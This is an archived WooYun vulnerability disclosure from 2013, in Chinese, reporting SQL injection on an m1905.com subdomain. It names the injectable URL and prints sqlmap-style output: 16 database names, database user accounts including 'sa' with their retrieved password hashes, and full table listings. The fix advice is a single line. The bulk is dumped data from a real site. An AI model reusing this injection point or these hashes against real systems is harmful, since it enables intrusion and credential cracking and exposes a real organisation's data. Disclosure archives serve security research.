<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		M1905.COM分站SQL注入漏洞  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		M1905.COM分站SQL注入漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Hxai11">Hxai11</a> 
</li><li>提交时间：		2013-08-17 16:49</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2013-08-17：	细节已通知厂商并且等待厂商处理中<br/>
									2013-08-22：	厂商已经主动忽略漏洞，细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail">注入怪来了！</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail">注入地址：http://hantao.m1905.com/inc/book.asp?nid=175339<br />
<br />
<br />
<br />
</p><p class="detail"><a href="../images/17153200f8612149f546878b3b127bb387547e69.jpg" target="_blank"><img src="../images/17153200f8612149f546878b3b127bb387547e69.jpg" alt="TK5%@QCU)(GKLI1$HR}1LTP.jpg" width="600"/></a></p><p class="detail"><br />
<br />
<br />
<br />
</p><p class="detail"><a href="../images/171532493d4c6dbfe104df774e3bebc51b503abc.jpg" target="_blank"><img src="../images/171532493d4c6dbfe104df774e3bebc51b503abc.jpg" alt="9_@IUGIC7ZLL8)SP8DZEI]X.jpg" width="600"/></a></p><p class="detail"><br />
<br />
<br />
<br />
</p><pre><code>available databases [16]:<br />
[*] bak_cctv6<br />
[*] bbsblog2<br />
[*] cctv6<br />
[*] cmclist<br />
[*] go2m<br />
[*] jfu<br />
[*] master<br />
[*] model<br />
[*] msdb<br />
[*] temp_db<br />
[*] tempdb<br />
[*] tj<br />
[*] tjcctv6<br />
[*] user_int2<br />
[*] webdatagather<br />
[*] yy</code></pre><p class='detail'><br />
<br />
<br />
<br />
</p><pre><code>[10:13:08] [INFO] retrieved: m1905info<br />
[10:13:44] [INFO] retrieved: m1905read<br />
[10:14:21] [INFO] retrieved: sa<br />
[10:14:29] [INFO] retrieved: shby<br />
[10:14:47] [INFO] retrieved: websqlm1905<br />
[10:15:28] [INFO] fetching number of password hashes for user &#039;m1905info&#039;<br />
[10:15:28] [INFO] retrieved: 1<br />
[10:15:30] [INFO] fetching password hashes for user &#039;m1905info&#039;<br />
[10:15:30] [INFO] retrieved: 0x0100ccb4a17415ed75220aa8f7a26c9ef5ddaf36ba608812b<br />
a74<br />
[10:19:55] [INFO] fetching number of password hashes for user &#039;m1905read&#039;<br />
[10:19:55] [INFO] retrieved: 1<br />
[10:19:57] [INFO] fetching password hashes for user &#039;m1905read&#039;<br />
[10:19:57] [INFO] retrieved: 0x010000131d5f5f07ed17dabc099cae46b17d90b18ff49dab3<br />
2d8<br />
[10:24:02] [INFO] fetching number of password hashes for user &#039;sa&#039;<br />
[10:24:02] [INFO] retrieved: 1<br />
[10:24:04] [INFO] fetching password hashes for user &#039;sa&#039;<br />
[10:24:04] [INFO] retrieved: 0x01004086ceb6b4fe70e9554334c2a77ab722ea8333e67ffb3<br />
25f<br />
[10:27:48] [INFO] fetching number of password hashes for user &#039;shby&#039;<br />
[10:27:48] [INFO] retrieved: 1<br />
[10:27:50] [INFO] fetching password hashes for user &#039;shby&#039;<br />
[10:27:50] [INFO] retrieved: 0x0100a3c21f5b78d25306588b9041f0cda9da0d62418da18fd<br />
d9a<br />
[10:31:57] [INFO] fetching number of password hashes for user &#039;websqlm1905&#039;<br />
[10:31:57] [INFO] retrieved: 1<br />
[10:32:00] [INFO] fetching password hashes for user &#039;websqlm1905&#039;<br />
[10:32:00] [INFO] retrieved: 0x01008e750f01cd336410014e28f9c1c9632a2659c4d3df99e<br />
39b</code></pre><p class='detail'><br />
<br />
<br />
<br />
</p><pre><code>Database: cctv6<br />
[101 tables]<br />
+-----------------------+<br />
| CMC                   |<br />
| FengDuan400           |<br />
| Gradepoint            |<br />
| LaterP2P              |<br />
| LeavingsMovie         |<br />
| MainReview            |<br />
| News_Hits             |<br />
| Records               |<br />
| Stat_Ad_Hits          |<br />
| SummerActivity        |<br />
| TVote                 |<br />
| TVoteClass            |<br />
| Theater_content       |<br />
| Theater_list          |<br />
| Theater_type          |<br />
| VIEW1                 |<br />
| keys                  |<br />
| act_word              |<br />
| adminip               |<br />
| bakNEWSP2P            |<br />
| bakNEWSP2P_High       |<br />
| bakNewLaterP2P        |<br />
| border                |<br />
| category              |<br />
| cctv6_badwords        |<br />
| cn                    |<br />
| comments              |<br />
| comments_bak20090714  |<br />
| config                |<br />
| dafen                 |<br />
| diaocha               |<br />
| dtproperties          |<br />
| ebook_users           |<br />
| f_channel             |<br />
| f_channel_server      |<br />
| hcomments1            |<br />
| info_file             |<br />
| info_video            |<br />
| ipai_video            |<br />
| keynews               |<br />
| ku6FilmM1905          |<br />
| ku6videolist          |<br />
| list2                 |<br />
| log                   |<br />
| log_sync              |<br />
| message               |<br />
| msg_review            |<br />
| mytest                |<br />
| news                  |<br />
| news20091020          |<br />
| news_ad               |<br />
| news_delete090826     |<br />
| news_filmorder_stats  |<br />
| news_keys             |<br />
| news_keys_content     |<br />
| news_parameter        |<br />
| news_review           |<br />
| news_video_parameter  |<br />
| news_video_src        |<br />
| newserr               |<br />
| p2pResult             |<br />
| pd_upfile             |<br />
| pl_content            |<br />
| pl_list               |<br />
| pl_type               |<br />
| reg                   |<br />
| research              |<br />
| review                |<br />
| searchkeys            |<br />
| t_temp_bbs_home       |<br />
| t_temp_boke_home      |<br />
| t_temp_drm_log        |<br />
| t_temp_news_ad        |<br />
| t_temp_news_new       |<br />
| t_temp_news_subject   |<br />
| t_temp_news_videoinfo |<br />
| temp_cinema_top       |<br />
| temp_label            |<br />
| temp_label_class      |<br />
| temp_list_data        |<br />
| temp_news             |<br />
| temp_other_file       |<br />
| temp_other_file_class |<br />
| temp_style            |<br />
| temp_style_class      |<br />
| temp_templets         |<br />
| temp_templets_class   |<br />
| template              |<br />
| test                  |<br />
| toupiao               |<br />
| toupiao_c             |<br />
| toupiaopic            |<br />
| trace_20090423        |<br />
| track_20090320        |<br />
| type                  |<br />
| userCollect           |<br />
| user_email            |<br />
| userlabel             |<br />
| userup                |<br />
| v_pl_content          |<br />
| ypcomments            |<br />
+-----------------------+<br />
<br />
<br />
Database: user_int2<br />
[7 tables]<br />
+--------------+<br />
| int_config   |<br />
| int_conlist  |<br />
| int_deta     |<br />
| int_detalist |<br />
| int_month    |<br />
| int_week     |<br />
| int_year     |<br />
+--------------+<br />
<br />
<br />
<br />
Database: yy<br />
[5 tables]<br />
+--------------+<br />
| TbNewType    |<br />
| Tbadmage     |<br />
| Tbnews       |<br />
| TbpicType    |<br />
| dtproperties |<br />
+--------------+<br />
<br />
Database: jfu<br />
[14 tables]<br />
+--------------+<br />
| catalog      |<br />
| adgroup      |<br />
| app          |<br />
| app_en       |<br />
| arti         |<br />
| arti_en      |<br />
| arti_item    |<br />
| arti_pic     |<br />
| behind_users |<br />
| catalog_12   |<br />
| catalog_en   |<br />
| dtproperties |<br />
| info         |<br />
| webconfig    |<br />
+--------------+<br />
<br />
<br />
Database: bbsblog2<br />
[98 tables]<br />
+--------------------------+<br />
| Activities               |<br />
| Activities_group         |<br />
| Activities_list          |<br />
| BBSXP_Advertisements     |<br />
| BBSXP_BlackWhiteUser     |<br />
| BBSXP_EventLog           |<br />
| BBSXP_FavoriteForums     |<br />
| BBSXP_FavoriteThreads    |<br />
| BBSXP_FavoriteUsers      |<br />
| BBSXP_FavoriteUsersgroup |<br />
| BBSXP_ForumPermissions   |<br />
| BBSXP_Forums             |<br />
| BBSXP_Forums_groups      |<br />
| BBSXP_Forums_users       |<br />
| BBSXP_Groups             |<br />
| BBSXP_Links              |<br />
| BBSXP_PostAttachments    |<br />
| BBSXP_PostRating         |<br />
| BBSXP_PrivateMessages    |<br />
| BBSXP_Ranks              |<br />
| BBSXP_Reputation         |<br />
| BBSXP_Roles              |<br />
| BBSXP_SiteSettings       |<br />
| BBSXP_Statistics         |<br />
| BBSXP_Subscriptions      |<br />
| BBSXP_Threads            |<br />
| BBSXP_UserActivation     |<br />
| BBSXP_UserOnline         |<br />
| BBSXP_Users              |<br />
| BBSXP_Votes              |<br />
| Theater_content          |<br />
| Theater_list             |<br />
| Theater_type             |<br />
| all_post1                |<br />
| all_topic                |<br />
| blog_Stylecolumn         |<br />
| blog_ad                  |<br />
| blog_code                |<br />
| blog_contentraise        |<br />
| blog_filelist            |<br />
| blog_filemold            |<br />
| blog_lastv               |<br />
| blog_layout              |<br />
| blog_log                 |<br />
| blog_logclass            |<br />
| blog_loguservotes        |<br />
| blog_logvotes            |<br />
| blog_logvoteslist        |<br />
| blog_style               |<br />
| blog_styledef            |<br />
| blog_styledeflist        |<br />
| blog_stylelist           |<br />
| blog_subject             |<br />
| blog_tags                |<br />
| blog_usercolumnid        |<br />
| blog_usercontent         |<br />
| blog_userdefinition      |<br />
| blog_userfile            |<br />
| blog_userlinks           |<br />
| blog_userlist            |<br />
| blog_usermessage         |<br />
| blog_userphotoalbum      |<br />
| blog_userphotoclass      |<br />
| blog_userphotocomments   |<br />
| blog_userphotohfcomments |<br />
| blog_userphotos          |<br />
| blog_userstyledef        |<br />
| blog_usertags            |<br />
| blog_usertype            |<br />
| dtproperties             |<br />
| group_Log                |<br />
| group_announce           |<br />
| group_class              |<br />
| group_gluser             |<br />
| group_lastv              |<br />
| group_layout             |<br />
| group_links              |<br />
| group_list               |<br />
| group_style              |<br />
| group_styledef           |<br />
| group_styledeflist       |<br />
| group_stylelist          |<br />
| group_users              |<br />
| group_userstyledef       |<br />
| sysdiagrams              |<br />
| t08112201                |<br />
| t20081123_1              |<br />
| t20081123_2              |<br />
| t20081123_3              |<br />
| t20081123_4              |<br />
| t20081123_5              |<br />
| t20081123_6              |<br />
| t20081123_7              |<br />
| t20081123_8              |<br />
| t20081126_1              |<br />
| t_temp_bbs_home          |<br />
| t_temp_boke_home         |<br />
| user_error               |<br />
+--------------------------+</code></pre><p class='detail'> </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail"></p><p class="detail"><a href="../images/171533463d3c33e0eaeb8f6b9f99579a44329b69.jpg" target="_blank"><img src="../images/171533463d3c33e0eaeb8f6b9f99579a44329b69.jpg" alt="9_@IUGIC7ZLL8)SP8DZEI]X.jpg" width="600"/></a></p><p class="detail"> </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail">防注入了，少用asp的。。 </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Hxai11" title="Hxai11">Hxai11</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-034594" title="M1905.COM分站SQL注入漏洞">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
															<h3 class="detailTitle">厂商回应：</h3>
						<p class="detail">危害等级：无影响厂商忽略</p>
													<p class="detail">忽略时间：2013-08-17 16:49</p>
												<h3 class="detailTitle">厂商回复：</h3>				
						<p class="detail"></p>
											

					
					
					<h3 class="detailTitle">最新状态：</h3>

											<p class="detail">暂无</p>
					

							
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="34594";
var bugRating="-3";
var myRating="";
var ratingCount="0";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
